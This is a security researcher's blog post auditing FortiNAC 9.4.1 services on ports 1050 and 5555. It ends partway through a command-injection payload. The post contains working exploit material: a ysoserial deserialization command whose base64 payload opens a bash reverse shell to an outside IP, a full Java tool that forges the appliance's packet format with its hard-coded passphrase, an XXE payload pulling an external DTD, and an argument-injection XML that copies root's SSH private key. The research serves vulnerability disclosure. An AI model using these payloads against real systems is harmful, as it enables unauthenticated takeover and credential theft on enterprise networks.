@@ -1,0 +1,825 @@
+---
+layout: post
+title:  "FortiNAC - Just a few more RCEs"
+date:   2023-06-19 01:00:00 +0200
+categories: vulns4free
+---
+
+>  FortiNAC is a zero-trust access solution that oversees and protects all digital assets connected to the enterprise network, covering devices from IT, IoT, OT/ICS to IoMT.
+> -- https://www.fortinet.com/products/network-access-control
+
+In Februar, 2023, a new vulnerability hit the mainstream news: **CVE-2022-39952** (see [FG-IR-22-300](https://www.fortiguard.com/psirt/FG-IR-22-300)). Exploitation allowed an unauthenticated attacker to achieve remote code execution (RCE) on **FortiNAC** devices **prior to version 9.4.1** through a chain targeting TCP port 8443. In short: an unprotected JSP file reachable via `/configWizard/keyUpload.jsp` allowed to upload a ZIP file which then got extracted to fully controlled paths.
+
+There is a nicely written [blog post by the Horizon3.ai team](https://www.horizon3.ai/fortinet-fortinac-cve-2022-39952-deep-dive-and-iocs/) explaining the chain with a proof-of-concept exploit being published on GitHub.
+
+## Recon
+
+Shortly after the first *CVE-2022-39952* disclosures I thought, why not looking at this product in the **patched version 9.4.1** to find some more vulnerabilities? Luckily, [Zach Hanley](https://twitter.com/hacks_zach) from Horizon3.ai provided me both, the unpatched (9.4.0) and patched version (9.4.1) as virtual machine images. But where to start now? I assumed that most other people might have a look at the service on TCP port 8443 in greater detail, since there were tons of other JSP files. Because of this I focused on additional services which seemed to be started by default and of course being exposed on all network interfaces as well.
+
+```
+> netstat -antp | grep LISTEN
+tcp        0      0 127.0.0.1:8010          0.0.0.0:*               LISTEN      4237/java           
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      4095/mysqld         
+tcp        0      0 127.0.0.1:8013          0.0.0.0:*               LISTEN      4367/java           
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1318/sshd           
+tcp6       0      0 :::41434                :::*                    LISTEN      2547/java           
+tcp6       0      0 :::1050                 :::*                    LISTEN      4237/java           
+tcp6       0      0 :::8443                 :::*                    LISTEN      4237/java           
+tcp6       0      0 :::36226                :::*                    LISTEN      4237/java           
+tcp6       0      0 :::8080                 :::*                    LISTEN      4237/java           
+tcp6       0      0 127.0.0.1:8081          :::*                    LISTEN      4237/java           
+tcp6       0      0 :::33458                :::*                    LISTEN      4367/java           
+tcp6       0      0 :::5555                 :::*                    LISTEN      2547/java           
+tcp6       0      0 :::22                   :::*                    LISTEN      1318/sshd
+```
+
+Indeed, several services were started on the device by default and I had a closer look at the *Java* processes. I focused on the PIDs **4237/java** and **2547/java** because each of these seemed to implement multiple service at once.
+
+## Auditing Service Port 1050
+
+Starting with TCP port 1050 belonging to the PID 4237, the process listing returned the following Java start routine: `/usr/bin/java -server -XX:InitialRAMPercentage=5.0 -XX:MaxRAMPercentage=55.0 -agentlib:jdwp=transport=dt_socket,address=localhost:8010,server=y,suspend=n -XX:+HeapDumpOnOutOfMemoryError -XX:ErrorFile=./logs/hs_err_pid%p.log -XX:OnOutOfMemoryError=logger -s Java process %p encountered an OutOfMemoryError;kill -9 %p -Dyams.dist=/bsc/campusMgr -Djdk.nio.maxCachedBufferSize=262144 -Djava.awt.headless=true -Dorg.jboss.logging.provider=jdk -Djava.util.logging.config.file=./logging.properties -Dcom.bsc.server.PluginLoader.serial=true -Dcom.bsc.server.host=localhost.localdomain -Dcom.bsc.server.port=1050 -classpath .:/bsc/campusMgr/lib/*:./properties_plugin:/bsc/campusMgr/properties com.bsc.server.Yams -m [?MAC_ADDRESS?]`.
+
+The entry point class turned out to be `com.bsc.server.Yams`, so let's start with this: collecting all JAR files, putting them all together and decompiling everything at once (see e.g. [this blog post of mine for a howto](https://frycos.github.io/vulns4free/2022/05/24/security-code-audit-fails.html)).
+
+We explore the code base starting at `com.bsc.server.Yams.main(String[] args)`.
+
+```java
+public static void main(final String[] args) {
+    final double version = getJavaVersion();
+    if (version < 1.6) {
+        System.out.println("Error: Incorrect java version. Java 1.6 or higher required. Version = " + version);
+        System.exit(1);
+    }
+    Thread.setDefaultUncaughtExceptionHandler(new YamsExceptionHandler());
+    try {
+        final Yams server = new Yams();
+        server.start(args); // [1]
+    }
+	...
+```
+
+Calling the method at `[1]` brings us to `com.bsc.server.Yams.start(String[] args)`.
+
+```java
+public void start(final String[] args) {
+    this.startDate = new Date();
+    Yams.startTime = System.currentTimeMillis();
+    final Runtime runtime = Runtime.getRuntime();
+    runtime.addShutdownHook(this.shutdown = new Thread(new ShutdownThread(), "YamsShutdownThread"));
+    ResourceManager.addResourceBundle("com.bsc.properties.yams");
+    this.initialize(args);
+    X509Provider.install();
+    this.log(this.softwareProperties.getProductVersion());
+    this.log(this.licenseManager.getVendor() + " " + this.softwareProperties.getCMOSBrandable());
+    this.log("Build Label: " + this.softwareProperties.getBuildLabel());
+    if (this.master != null && !this.master.equals(Yams.name)) {
+        this.isSlave = true;
+        this.waitForMasterLoader();
+    }
+    this.loadPlugins();
+    final String productType = this.licenseManager.getType();
+    this.updateDatabase(productType);
+    this.log("**** " + Yams.name + " Is Ready ****");
+    this.readyPlugins();
+    if (!this.isSlave) {
+        this.createSockets(); // [2]
+    }
+	...
+```
+
+Assuming we've a standalone FortiNAC instance (or being the master node in a clustered configuration), a socket creation method is called at `[2]`, leading us to `com.bsc.server.Yams.createSockets()`.
+
+```java
+public void createSockets() {
+    try {
+        final String port = System.getProperty("com.bsc.server.port"); // [3]
+        int p = 1051;
+        try {
+            final Long val = Long.decode(port);
+            p = val.intValue();
+        }
+        catch (final Exception e) {
+            System.out.println("Can't connect to " + p);
+            p = 1051;
+        }
+        final ORB myORB = ORB.init(new String[0], null);
+        final Stub masterStub = (Stub)PortableRemoteObject.toStub(this);
+        masterStub.connect(myORB);
+        this.acceptConnection = new CampusManagerSocket(p, "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,TLS_RSA_WITH_AES_128_GCM_SHA256,TLS_RSA_WITH_AES_128_CBC_SHA,TLS_RSA_WITH_AES_128_CBC_SHA256,TLS_RSA_WITH_AES_256_CBC_SHA", "TLSv1.2", false, new CampusManagerSocketListener() { // [4]
+            @Override
+            public void callbackListener(final Socket s) {
+                final Thread t = new Thread(new SSLSocketHandler(s, masterStub), "SSL Socket - " + s.getRemoteSocketAddress() + ":" + s.getPort()); // [5]
+                t.start(); 
+            }
+        });
+        final Thread t = new Thread(this.acceptConnection, this.acceptConnection.getClass().getName());
+        t.start(); 
+    }
+	...
+```
+
+At `[3]` the listening port is read from a property. You might have already spotted this in the command line of the process above as `-Dcom.bsc.server.port=1050`. At `[4]` a `com.bsc.server.CampusManagerSocket.CampusManagerSocket` constructor is called with a lot of parameters. The most interesting one you'll find at the very end pointing to an interface definition `com.bsc.server.CampusManagerSocketListener` with a single method `void callbackListener(final Socket p0)`. This method is directly implemented in the same place, annotated with `@Override`. Finally, a `java.lang.Thread` object is created `[5]` and started. The first parameter of the `Thread` constructor takes a `Runnable target` which in this case equals to a `com.bsc.server.Yams.SSLSocketHandler.SSLSocketHandler`.
+
+Since this `Runnable` will process events in its `run()` method, after the `Thread` is started, we've to look at its implementation.
+
+```java
+@Override
+public void run() {
+    try {
+        final InetAddress remoteHost = this.socket.getInetAddress();
+        if (Yams.this.debug || !remoteHost.getHostAddress().equals(Yams.localIP)) {
+            YamsPluginBase.this.log("Client connecting from IP = " + remoteHost.getHostAddress() + " name = " + remoteHost.getHostName() + " port = " + this.socket.getPort() + "\n");
+            Yams.this.connections.put(remoteHost, new Date());
+        }
+        this.socket.setSoTimeout(30000);
+        byte[] store = X509Provider.getClientSideKeyStore();
+        final ObjectOutputStream stream = new ObjectOutputStream(this.socket.getOutputStream());
+        stream.writeObject(this.masterStub);
+        stream.writeObject(store);
+        final ObjectInputStream inStream = new ObjectInputStream(this.socket.getInputStream()); // [6]
+        store = (byte[])inStream.readObject(); // [7]
+        Yams.this.addKeyStore(store);
+        stream.close();
+        inStream.close();
+    }
+	...
+```
+
+This handler reads data from the socket via `java.net.Socket.getInputStream()` into a `java.io.ObjectInputStream` `[6]` and...calls `readObject()` on it at `[7]`. Sounds like "game over" and I already bet my favourite Java gadgets would have been available in the class path. The java version **1.8.0_332** also didn't give me any headaches so far. We find plenty of nice Java libraries in `/bsc/campusMgr/lib`, `commons-beanutils-1.9.2.jar` being one of them.
+
+We don't have any more reasons to wait, so create and send the payload for a reverse shell over a `ncat` SSL connection: `java -jar ysoserial-master-SNAPSHOT.jar CommonsBeanutils1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMzcuMC4xNi8xMzM3IDA+JjE=}|{base64,-d}|{bash,-i}" | ncat --ssl 10.137.0.34 1050`
+
+![fortinacRCE1.png](/assets/images/fortinac/fortinacRCE1.png)
+
+We got a shell as `nac` user: **First unauthenticated RCE** in round 1.
+
+## Auditing Service Port 5555
+
+That nice and all, but let's look at another service which might be a bit more challenging and interesting to exploit. Looking at the other process with PID 2547, what can we find in its command line call? `/usr/bin/java -server -Xms32m -Xmx768m -Dyams.dist=/bsc/campusMgr -classpath .:/bsc/campusMgr/lib/*:./properties_plugin:/bsc/campusMgr/properties com.bsc.server.CampusManager /bsc/campusMgr/bin/.networkConfig /bsc/campusMgr/master_loader/.cmas`.
+
+Starting with the class `com.bsc.server.CampusManager` this time, including some parameters for the entry point. Again, we're starting at the `main` method `com.bsc.server.CampusManager.main(String[] args)`.
+
+```java
+public static void main(final String[] args) {
+    final double version = getJavaVersion();
+    if (version < 1.6) {
+        System.out.println("Error: Incorrect java version. Java 1.6 or higher required. Version = " + version);
+        System.exit(1);
+    }
+    loadProperties("com.bsc.loader.system.property.");
+    X509Provider.install();
+    System.setProperty("javax.rmi.CORBA.UtilClass", "com.bsc.api.CORBAUtil");
+    Thread.setDefaultUncaughtExceptionHandler(new YamsExceptionHandler());
+    try {
+        final CampusManager campusManager = new CampusManager(args); // [1]
+    }
+	...
+```
+
+At `[1]` the constructor for `com.bsc.server.CampusManager.CampusManager(String[] args)` gets called, passing along the input arguments. This constructor is huge such that I only try to cut out the relevant stuff for you.
+
+```java
+public CampusManager(final String[] args) {
+    ...
+    if (args.length >= 2) {
+        this.configFile0 = args[0];
+        this.configFile1 = args[1];
+        final String yamsDist = YamsDist.getCampusMgrPath();
+        final File file = new File(yamsDist + "/.intialResources");
+        if (file.exists()) {
+            ResourceManager.loadInitialResources(yamsDist + "/.intialResources");
+        }
+        this.readConfigFiles(this.configFile0, this.configFile1, true, true); // [2]
+    }
+	...
+```
+
+Hitting the method call at `[2]` brings us to the implementation of `com.bsc.server.CampusManager.readConfigFiles(String file0, String file1, boolean createNewLog, boolean startProcesses)`. This is another huge function, therefore the relevant snippets are shown here.
+
+```java
+public void readConfigFiles(final String file0, final String file1, final boolean createNewLog, final boolean startProcesses) {
+    this.debug("starting readConfigFiles");
+    ...
+    this.name = this.product;
+    if (this.name != null) {
+        if (startProcesses) {
+            this.sslSocketThread = new CampusManagerSocket(this.serverPort, "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,TLS_RSA_WITH_AES_128_GCM_SHA256,TLS_RSA_WITH_AES_128_CBC_SHA,TLS_RSA_WITH_AES_128_CBC_SHA256,TLS_RSA_WITH_AES_256_CBC_SHA", "TLSv1.2", false, new CampusManagerSocketListener() {
+                @Override
+                public void callbackListener(final Socket s) { // [3]
+                    final Thread t = new Thread(new SSLSocketHandler(s), "SSL Socket - " + s.getRemoteSocketAddress() + ":" + s.getPort());
+                    t.start();
+                }
+            });
+            final Thread t = new Thread(this.sslSocketThread, this.sslSocketThread.getClass().getName());
+            t.start();
+            (this.commandThread = new CommandThread()).start();
+        }
+		...
+```
+
+Looks familiar, doesn't it? We have a `com.bsc.server.CampusManagerSocket.CampusManagerSocket` constructor with a parameter implementing `com.bsc.server.CampusManagerSocketListener`'s `callbackListener(final Socket s)` method at `[3]`.
+
+But this time, we find a `com.bsc.server.CampusManager.SSLSocketHandler.SSLSocketHandler` object in our `java.lang.Thread` constructor. Looking at the `run` method, not so straight-forward anymore, i.e. no lonely `readObject` waiting for us to be called.
+
+```java
+@Override
+public void run() {
+    final InetAddress remoteHost = this.socket.getInetAddress();
+    final int port = this.socket.getPort();
+    try {
+        if (CampusManager.this.debug || !remoteHost.getHostAddress().equals(CampusManager.this.ip)) {
+            CampusManager.this.debug("Client connecting from IP = " + remoteHost.getHostAddress() + " name = " + remoteHost.getHostName() + " port = " + this.socket.getPort());
+        }
+        this.socket.setSoTimeout(0);
+        this.socket.setKeepAlive(true);
+        final OutputStream out = this.socket.getOutputStream();
+        final InputStream in = this.socket.getInputStream();
+        while (true) {
+            final CampusManagerPacket packet = new CampusManagerPacket(remoteHost, port, in); // [4]
+            if (packet.isValidHeader()) {
+                CampusManager.this.processPacket(packet, out);
+            }
+        }
+    }
+	...
+```
+
+Yes, again the input from the socket is read by `java.net.Socket.getInputStream()` but this time into a `java.io.InputStream` variable. So what happens with our data at `[4]`?
+The large `com.bsc.util.CampusManagerPacket.CampusManagerPacket(InetAddress address, int port, InputStream in)` constructor gives us the answers we're looking for.
+
+```java
+public CampusManagerPacket(final InetAddress address, final int port, final InputStream in) throws IOException {
+		...
+    this.passPhrase = "C1#!ff24A0K2"; // *cough*
+		...
+    this.unpackInputStream(in, packetLength); // [5]
+}
+```
+
+At `[5]` our `InputStream` is forwarded to the method `com.bsc.util.CampusManagerPacket.unpackInputStream(InputStream in, int packetLength)`.
+
+```java
+private void unpackInputStream(final InputStream in, final int packetLength) throws IOException {
+    final DataInputStream input = new DataInputStream(in); //[6]
+    this.requestID = input.readInt(); // [7]
+    this.responseID = input.readInt(); // [8]
+    this.verb = input.readInt(); // [9]
+    int len = input.readInt(); // [10]
+    this.length = len;
+    if (len > 4000) {
+        len = packetLength - 32;
+        this.error = 3;
+    }
+    final byte[] packetHash = new byte[16];
+    for (int i = 0; i < 16; ++i) {
+        packetHash[i] = input.readByte(); // [11]
+    }
+    final byte[] calculatedHash = this.hashHeader((int)this.requestID, (int)this.responseID, this.verb, this.length);
+    this.validHeader = Arrays.equals(packetHash, calculatedHash);
+    this.aesEncryptionEnabled = ((this.verb & 0x1000000) != 0x0);
+    this.verb &= 0xFFFFFF;
+    if (len > 0) {
+        input.readFully(this.compressedData = new byte[len]); // [12]
+    }
+    if (this.compressedData != null && this.aesEncryptionEnabled) {
+        final byte[] b = this.passPhrase.getBytes();
+        final ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        final DataOutputStream output = new DataOutputStream(baos);
+        output.write(b, 0, b.length);
+        output.writeInt((int)this.requestID);
+        final byte[] phrase = baos.toByteArray();
+        this.compressedData = EncodeDecode.decryptAES(phrase, this.compressedData);
+        output.close();
+        baos.close();
+    }
+}
+```
+
+This seems to be some kind of custom packet format being processed, so we do have to understand the structure first.
+
+At `[6]` our input flows into a `java.io.DataInputStream.DataInputStream` constructor. Then every line from `[7]` to `[10]` reads the next four bytes from the stream, then being interpreted as an `int`. `requestID, responseID, verb` and `len` will be relevant later but as you see, all of these are user-controlled.
+
+This is also the case for a packet hash, fetched from the stream at `[11]`. This is then compared to a `calcluatedHash` which...well consists of a calculation solely based on the other variables we control already.
+
+At `[12]` then, the remaining data are read from the stream into the `compressedData` variable. Depending on the `verb`, there might be an additional *decryption routine*. That wouldn't hold as back of course because the secret key is *hard-coded* anyways...
+
+Back to our `com.bsc.server.CampusManager.SSLSocketHandler.run()` method, `packet.isValidHeader()` will be equal to `true` for sure, because we understood the packet structure and know what we're doing, right? The next line in the code flow hits `CampusManager.this.processPacket(packet, out)`.
+
+```java
+private void processPacket(final CampusManagerPacket packet, final OutputStream out) throws IOException {
+    final InetAddress host = packet.getAddress();
+    final int port = packet.getPort();
+    final String packetIP = host.getHostAddress();
+    this.debug("ReceivePacket IP = " + packetIP + " port = " + port + " Verb = " + CampusManagerPacket.verbToString(packet.getVerb()) + " RequestID = " + packet.getRequestID() + " ResponseID = " + packet.getResponseID() + " length = " + packet.getLength());
+    String xml = null;
+    try {
+        xml = this.processPacket(packet); // [13]
+    }
+    catch (final Exception e) {
+        e.printStackTrace();
+        xml = "Process aborting. " + e.getMessage();
+    }
+    if (packet.getVerb() != 2) {
+        final CampusManagerPacket p = new CampusManagerPacket();
+        p.setAddress(host);
+        p.setPort(port);
+        p.setVerb(2);
+        p.setResponseID(packet.getRequestID());
+        p.setXml(xml);
+        final DataOutputStream dos = new DataOutputStream(out);
+        p.writePacket(dos);
+        dos.flush();
+    }
+}
+```
+
+At `[13]` we spot an `xml` variable, the content coming from within our packet. Smells like a chance for **XML External Entity (XXE)** exploitation?! 
+
+### XML External Entity
+
+Looking into `com.bsc.server.CampusManager.processPacket(CampusManagerPacket packet)` next reveals:
+
+```java
+private String processPacket(final CampusManagerPacket packet) throws Exception {
+    String retval = null;
+    final int verb = packet.getVerb(); // [14]
+    this.debug("processPacket() Verb = " + CampusManagerPacket.verbToString(verb));
+    if (verb == 2) {
+        this.requests.remove(new Long(packet.getResponseID()));
+        this.responses.addResponse(packet);
+    }
+    else if (verb == 4) {
+        this.setDebug(!this.debug);
+    }
+    ...
+    else if (verb == 5) {
+        final CommandObject obj = new CommandObject(packet.getXml()); // [15]
+        this.log(obj.toString());
+        if (obj.commandName == null || !this.isAllowedRemoteCommand(obj.commandName)) {
+            this.log("WARNING: remote command not allowed (" + obj.commandName + ")");
+            throw new Exception("Remote command not allowed (" + obj.commandName + ")");
+        }
+        try {
+            this.commandVector.put(obj);
+        }
+        catch (final InterruptedException e) {
+            e.printStackTrace();
+        }
+    }
+    ...
+    else if (verb == 9) {
+        this.debug("configFiles: " + this.configFile0 + "  " + this.configFile1);
+        this.talkedToPartner = false;
+        this.readConfigFiles(this.configFile0, this.configFile1, false, false);
+        final InetAddress remoteAddress = packet.getAddress();
+        final String remoteIP = remoteAddress.getHostAddress();
+        if (this.controlServer && this.inControl) {
+            this.sendToNetwork(9, remoteIP);
+        }
+    }
+    else if (verb == 11) {
+        this.shutdown = true;
+    }
+    if (retval == null && verb != 2 && verb != 6) {
+        retval = this.buildAck();
+    }
+    return retval;
+}
+```
+
+Our `com.bsc.util.CampusManagerPacket packet` comes in and the `verb` gets extracted at `[14]`. Depending on this `verb` different operations can be triggered. There exist quite a number of `else if` constructs but I again cut out the most relevant parts for my readers.
+
+For no specific reasons, we focus on the verb being equal to `5` case so at `[15]` the XML content is retrieved from the packet via `com.bsc.util.CampusManagerPacket.getXml()`. This method is not particularly interesting, i.e. only some decompressing takes place. But the `com.bsc.server.CampusManager.CommandObject.CommandObject(String xml)` constructor implementation confirms our initial assumption.
+
+```java
+public CommandObject(final String xml) {
+    this.commandName = null;
+    this.args = new String[0];
+    this.buffer = new StringBuffer();
+    this.time = 0L;
+    this.retval = false;
+    this.index = 0;
+    try {
+        final StringReader reader = new StringReader(xml);
+        final InputSource source = new InputSource(reader);
+        final DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+        final DocumentBuilder builder = factory.newDocumentBuilder();
+        final Document doc = builder.parse(source); // [16]
+        doc.getDocumentElement().normalize();
+        this.commandName = CampusManagerMachine.getXmlValue(doc, "commandName");
+        if (this.commandName != null) {
+            this.commandName = this.commandName.trim();
+        }
+        final String[] tmp = CampusManagerMachine.getXmlValues(doc, "arg");
+        if (tmp != null) {
+            this.args = tmp;
+        }
+    }
+	...
+```
+
+At `[16]` we hit a well-known **XXE sink** `javax.xml.parsers.DocumentBuilder.parse(InputSource is)`. But to prove this, we need a little bit of code because the custom packet structure has to be created manually. I'll give you the full implementation here.
+
+```java
+import java.io.ByteArrayOutputStream;
+import java.io.DataOutputStream;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.StringReader;
+import java.nio.ByteBuffer;
+import java.nio.charset.Charset;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
+import java.util.zip.Deflater;
+
+import javax.xml.parsers.DocumentBuilder;
+import javax.xml.parsers.DocumentBuilderFactory;
+import org.w3c.dom.Document;
+import org.w3c.dom.Node;
+import org.w3c.dom.NodeList;
+import org.xml.sax.InputSource;
+
+public class BuildPacket {
+
+	public static void main(String[] args) throws Exception {
+		FileOutputStream fos = new FileOutputStream("test_packet");
+		DataOutputStream dos = new DataOutputStream(fos);
+		int requestId = 1;
+		int responseID = 2;
+		int verb = 5;
+
+		// Encryption
+		String passPhrase = "C1#!ff24A0K2";
+		final byte[] b = passPhrase.getBytes();
+		final ByteArrayOutputStream baos = new ByteArrayOutputStream();
+		final DataOutputStream output = new DataOutputStream(baos);
+		output.write(b, 0, b.length);
+		output.writeInt((int) requestId);
+		final byte[] phrase = baos.toByteArray();
+
+		String xml = readFile("test.xml", Charset.defaultCharset());
+		//checkXml(xml);
+		byte[] compressedXml = compressXML(xml);
+		//byte[] encryptedcompressedXml = EncodeDecode.encryptAES(phrase, compressXML(xml));
+
+		int len = compressedXml.length;
+		// Built valid hash
+		byte[] packetHash = hashHeader(requestId, responseID, verb, len);
+
+		dos.writeInt(requestId);
+		dos.writeInt(responseID);
+		dos.writeInt(verb);
+		dos.writeInt(len);
+		dos.write(packetHash);
+		// Case 1: compressedXml, Case 2: encryptedcompressedXml
+		dos.write(compressedXml);
+
+		dos.flush();
+		dos.close();
+		fos.flush();
+		fos.close();
+		System.out.println("File written: test_packet");
+		if ((verb & 0x1000000) != 0x0)
+			System.out.println("Should contain encrypted part!");
+		System.out.println("Final verb:" + (verb & 0xFFFFFF));
+	}
+
+	private static byte[] hashHeader(final int requestID, final int responseID, final int verb, final int length) {
+		MessageDigest md5Digest;
+		try {
+			md5Digest = MessageDigest.getInstance("MD5");
+		} catch (final NoSuchAlgorithmException e) {
+			e.printStackTrace();
+			md5Digest = null;
+		}
+		byte[] hash = null;
+		if (md5Digest != null) {
+			ByteBuffer data = ByteBuffer.allocate(16);
+			data = data.putInt(0, requestID);
+			data = data.putInt(4, responseID);
+			data = data.putInt(8, verb);
+			data = data.putInt(12, length);
+			md5Digest.update(data.array());
+			hash = md5Digest.digest();
+		}
+		return hash;
+	}
+
+	private static byte[] compressXML(final String val) {
+		String xml;
+		if (val != null) {
+			Deflater compressor = null;
+			try {
+				xml = val;
+				final byte[] bytes = xml.getBytes();
+				compressor = new Deflater();
+				compressor.setLevel(9);
+				compressor.setInput(bytes);
+				compressor.finish();
+				final ByteArrayOutputStream bos = new ByteArrayOutputStream(bytes.length);
+				final byte[] buf = new byte[1024];
+				while (!compressor.finished()) {
+					final int count = compressor.deflate(buf);
+					bos.write(buf, 0, count);
+				}
+				bos.close();
+				return bos.toByteArray();
+			} catch (final Exception e) {
+				e.printStackTrace();
+			} finally {
+				if (compressor != null) {
+					compressor.end();
+				}
+			}
+		} else {
+			return null;
+		}
+		return null;
+	}
+
+	private static String readFile(String path, Charset encoding) throws IOException {
+		byte[] encoded = Files.readAllBytes(Paths.get(path));
+		return new String(encoded, encoding);
+	}
+
+	private static String getXmlValue(final Document doc, final String key) {
+		String value = null;
+		final NodeList nodeList = doc.getElementsByTagName(key);
+		if (nodeList.getLength() > 0) {
+			final Node node = nodeList.item(0);
+			final Node val = node.getFirstChild();
+			if (val != null && val.getNodeValue() != null) {
+				value = val.getNodeValue();
+			}
+		}
+		return value;
+	}
+
+	private static String[] getXmlValues(final Document doc, final String key) {
+		String[] values = null;
+		final NodeList nodeList = doc.getElementsByTagName(key);
+		if (nodeList.getLength() > 0) {
+			values = new String[nodeList.getLength()];
+			for (int i = 0; i < nodeList.getLength(); ++i) {
+				final Node node = nodeList.item(i);
+				final Node val = node.getFirstChild();
+				if (val != null && val.getNodeValue() != null) {
+					values[i] = val.getNodeValue();
+				}
+			}
+		}
+		return values;
+	}
+
+	private static void checkXml(String xml) throws Exception {
+		final StringReader reader = new StringReader(xml);
+		final InputSource source = new InputSource(reader);
+		final DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+		final DocumentBuilder builder = factory.newDocumentBuilder();
+		final Document doc = builder.parse(source);
+		doc.getDocumentElement().normalize();
+		String commandName = getXmlValue(doc, "commandName");
+		if (commandName != null) {
+			System.out.println(commandName.trim().toString());
+		}
+		final String[] tmp = getXmlValues(doc, "arg");
+		if (tmp != null) {
+			for(int i = 0; i < tmp.length; ++i)
+				System.out.println(tmp[i]);
+		}
+	}
+
+}
+```
+
+You could now provide an arbitrary `text.xml` file and running this code will give you an output file `test_packet`. This then could be directly delivered to the TCP port 5555 via `ncat --ssl`.
+
+Let's test the following XXE primitive, i.e. we build a `test.xml` with the following content:
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data SYSTEM "http://10.137.0.16:1337/parameterEntity_oob.dtd">
+<data>&send;</data>
+```
+
+After running our `BuildPacket` program on it, the `test_packet` file is delivered to the FortiNAC instance via `ncat --ssl 10.137.0.34 5555 < test_packet`.
+
+![fortinacXXE.png](/assets/images/fortinac/fortinacXXE.png)
+
+But "only" getting **unauthenticated XXE** didn't meet my expectations for what I've seen so far. Let's dig deeper!
+
+### Argument Injection
+
+If someone sees a name like `com.bsc.server.CampusManager.CommandObject`, we *have to* dig deeper as hackers, don't we? Thus, we have another look into the method `com.bsc.server.CampusManager.processPacket(CampusManagerPacket packet)`, especially the part of where the `verb` is equal to `5`.
+
+```java
+...
+else if (verb == 5) {
+    final CommandObject obj = new CommandObject(packet.getXml());
+    this.log(obj.toString());
+    if (obj.commandName == null || !this.isAllowedRemoteCommand(obj.commandName)) { // [17]
+        this.log("WARNING: remote command not allowed (" + obj.commandName + ")");
+        throw new Exception("Remote command not allowed (" + obj.commandName + ")");
+    }
+    try {
+        this.commandVector.put(obj); // [18]
+    }
+	...
+```
+
+The `CommandObject` holds an attribute `commandName` which is checked here against a list of **allowed remote commands** in `[17]`. If this turns out to be fine, at `[18]` the `CommandObject` is put into `commandVector` of type `BlockingQueue<CommandObject>`. But how are these commands executed and which ones are allowed at all?
+
+We check the allow list implementation first in `com.bsc.server.CampusManager.isAllowedRemoteCommand(String cmd)`.
+
+```java
+private boolean isAllowedRemoteCommand(final String cmd) {
+    boolean retval = false;
+    final String val = this.configManager.getValue("ALLOWED_REMOTE_CMDS"); // [19]
+    if (val != null && val.length() > 0) {
+        final String[] split;
+        final String[] arr = split = val.split(",");
+        for (final String s : split) {
+            if (cmd.contains(s)) {
+                retval = true;
+                break;
+            }
+        }
+    }
+	...
+```
+
+`ALLOWED_REMOTE_CMDS` at `[19]` seems to be a list, defined elsewhere, containing comma separated values for valid commands. We find this value being defined in `/bsc/campusMgr/master_loader/.cm`. 
+
+```bash
+ALLOWED_REMOTE_CMDS=installAgentPackage,configApache,install-bin
+```
+
+We start to look for these scripts or binaries on the FortiNAC instance and find them quickly, e.g. a shell script `/bsc/campusMgr/bin/installAgentPackage`. The reachable part in this script is shown next.
+
+```bash
+else
+    cp $1/$2 /bsc/campusMgr/agent/packages
+fi
+```
+
+for which we presumably have control over the argument parameters `$1` and `$2`. That's a good theory but can we really call this script with arbitrary arguments delivered through an XML over TCP port 5555? Following the code a bit further reveals how this `commandVector` is used later on.
+
+There is another `java.lang.Thread` extending class `com.bsc.server.CampusManager.CommandThread` which periodically takes care of checking some lists for new members. How does the `run()` method look like?
+
+```java
+@Override
+public void run() {
+    while (!CampusManager.this.shutdown) {
+        CommandObject obj = null;
+        try {
+            boolean done = false;
+            final long startTime = System.currentTimeMillis();
+            while (!done) {
+                done = true;
+                for (int i = 0; done && i < this.commands.size(); ++i) {
+                    final CommandObject val = this.commands.get(i);
+                    if (val != null && val.time + 600000L < startTime) {
+                        this.commands.remove(i);
+                        done = false;
+                    }
+                }
+            }
+            obj = CampusManager.this.commandVector.take(); // [20]
+            if (!CampusManager.this.shutdown && obj != null && obj.commandName != null && obj.args != null) {
+                this.commands.remove(obj);
+                this.commands.add(obj);
+                String systemCommand = obj.commandName.trim(); // [21]
+                for (int j = 0; j < obj.args.length; ++j) {
+                    if (obj.args[j] != null) {
+                        systemCommand = systemCommand + " " + obj.args[j].trim(); // [22]
+                    }
+                }
+                CampusManager.this.log("Running command = " + systemCommand);
+                final Process pr = Runtime.getRuntime().exec("sudo " + systemCommand); // [23]
+                final BufferedReader input = new BufferedReader(new InputStreamReader(pr.getInputStream()));
+                final BufferedReader error = new BufferedReader(new InputStreamReader(pr.getErrorStream()));
+                done = false;
+				...
+```
+
+At `[20]` the `commandVector` queue is checked for entries by retrieving and removing the head of the queue. From an entry, it takes the `commandName` value `[21]` as `systemCommand`, iterates over a list of `args` values and *concatenates*  them into a single String `[22]`. Finally, at `[23]` the overall command gets executed with a classic `java.lang.Runtime.getRuntime().exec(String command)` call. And...with `sudo` which means **built-in privilege escalation from `nac` to `root`**.
+
+Well, we seem to be restricted to the *allowed commands* but these already are quite powerful. For a proof-of-concept argument injection payload we build another `test.xml`.
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<commandName>installAgentPackage
+<arg>/root
+</arg>
+<arg>
+.ssh/id_rsa
+</arg>
+</commandName>
+```
+
+This should copy us the SSH private key of the `root` user to the directory `/bsc/campusMgr/agent/packages`. Works just fine! With these scripts one can already do several dangerous operations on the FortiNAC instance (reconfigure the Apache!) but again: not satisfied, yet.
+
+### Allow List Bypass - Argument Injection to Command Injection
+
+The experienced code auditors among you might already have spotted some flaw in the `com.bsc.server.CampusManager.isAllowedRemoteCommand(String cmd)` in the snippet above.
+
+```java
+if (cmd.contains(s)) {
+    retval = true;
+    break;
+}
+```
+
+The good old `contains` vs. `equals` case. Remember, we want to get rid of the argument injection case, so we've to get full control over the first command after `sudo`. Take this `test.xml` for example.
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<commandName>touch /tmp/RCE installAgentPackage
+<arg>
